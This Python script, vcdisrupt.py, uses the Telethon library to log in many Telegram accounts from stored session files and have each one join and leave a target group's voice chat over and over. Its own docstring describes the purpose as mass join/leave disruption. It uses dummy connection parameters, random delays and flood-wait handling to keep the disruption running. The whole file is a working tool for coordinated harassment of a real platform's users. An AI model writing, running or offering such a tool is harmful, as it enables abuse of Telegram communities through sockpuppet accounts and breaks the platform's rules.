#!/usr/bin/env python3
"""vcdisrupt.py — mass join/leave a Telegram VC. Called by app.py /vc"""
import argparse
import asyncio
import random
import sys
from pathlib import Path

import yaml
from telethon import TelegramClient, functions
from telethon.errors import FloodWaitError, ChatAdminRequiredError, UserAlreadyParticipantError
from telethon.tl.functions.phone import JoinGroupCallRequest, LeaveGroupCallRequest
from telethon.tl.types import DataJSON

CONFIG_PATH = Path("config.yaml")
SESSIONS_DIR = Path("sessions")


def load_cfg():
    if CONFIG_PATH.exists():
        return yaml.safe_load(open(CONFIG_PATH))
    return {
        "api_id": int(__import__("os").environ.get("TG_API_ID", "0")),
        "api_hash": __import__("os").environ.get("TG_API_HASH", ""),
    }


async def resolve_target(client, t):
    t = t.strip()
    if "t.me/+" in t or "joinchat/" in t:
        h = t.split("/")[-1].replace("+", "")
        try:
            inv = await client(functions.messages.CheckChatInviteRequest(h))
            if hasattr(inv, "chat"):
                return inv.chat
            up = await client(functions.messages.ImportChatInviteRequest(h))
            return up.chats[0]
        except Exception:
            return None
    if "t.me/" in t:
        t = t.split("t.me/")[-1].split("/")[0]
    if t.startswith("@"):
        t = t[1:]
    try:
        return await client.get_entity(t)
    except Exception:
        return None


async def get_call(client, entity):
    try:
        full = await client(functions.channels.GetFullChannelRequest(entity))
        return getattr(full.full_chat, "call", None)
    except Exception:
        return None


async def worker(session_path, target, cycles, api_id, api_hash):
    name = Path(session_path).stem
    client = TelegramClient(str(session_path), api_id, api_hash)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            print(f"[-] {name}: not authorized", flush=True)
            return
        entity = await resolve_target(client, target)
        if not entity:
            print(f"[-] {name}: cannot resolve target", flush=True)
            return
        call = await get_call(client, entity)
        if not call:
            print(f"[-] {name}: no active voice chat", flush=True)
            return

        me = await client.get_me()
        params = DataJSON(data='{"ufrag":"x","pwd":"y","fingerprints":[],"ssrc":1}')

        for i in range(cycles):
            try:
                res = await client(JoinGroupCallRequest(
                    call=call, join_as=me, params=params,
                    muted=True, video_stopped=True,
                ))
                source = None
                for u in getattr(res, "updates", []) or []:
                    s = getattr(u, "src", None)
                    if s:
                        source = s
                        break
                if not source:
                    source = i + 1

                await asyncio.sleep(random.uniform(0.2, 0.8))
                try:
                    await client(LeaveGroupCallRequest(call=call, source=source))
                except Exception:
                    pass
                await asyncio.sleep(random.uniform(0.3, 1.2))

            except FloodWaitError as e:
                print(f"[{name}] flood wait {e.seconds}s", flush=True)
                await asyncio.sleep(min(e.seconds, 60))
            except UserAlreadyParticipantError:
                try:
                    await client(LeaveGroupCallRequest(call=call, source=1))
                except Exception:
                    pass
            except ChatAdminRequiredError:
                print(f"[-] {name}: admin required", flush=True)
                break
            except Exception as e:
                print(f"[{name}] err {type(e).__name__}: {e}", flush=True)
                await asyncio.sleep(1)

        print(f"[+] {name}: done", flush=True)

    except Exception as e:
        print(f"[!] {name}: fatal {e}", flush=True)
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


async def main_async(target, cycles):
    cfg = load_cfg()
    api_id = cfg["api_id"]
    api_hash = cfg["api_hash"]
    if not api_id or not api_hash:
        print("[!] api_id/api_hash missing — set in config.yaml or TG_API_ID/TG_API_HASH")
        sys.exit(1)

    sessions = sorted(SESSIONS_DIR.glob("*.session"))
    if not sessions:
        print("[!] no sessions in sessions/")
        sys.exit(1)

    print(f"[*] target={target} cycles={cycles} accounts={len(sessions)}", flush=True)

    # limit concurrency to avoid hammering Telegram
    sem = asyncio.Semaphore(10)

    async def _wrap(s):
        async with sem:
            await worker(s, target, cycles, api_id, api_hash)

    await asyncio.gather(*[_wrap(s) for s in sessions])


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target", required=True)
    p.add_argument("--cycles", type=int, default=30)
    args = p.parse_args()
    try:
        asyncio.run(main_async(args.target, args.cycles))
    except KeyboardInterrupt:
        print("[!] interrupted", flush=True)


if __name__ == "__main__":
    main()
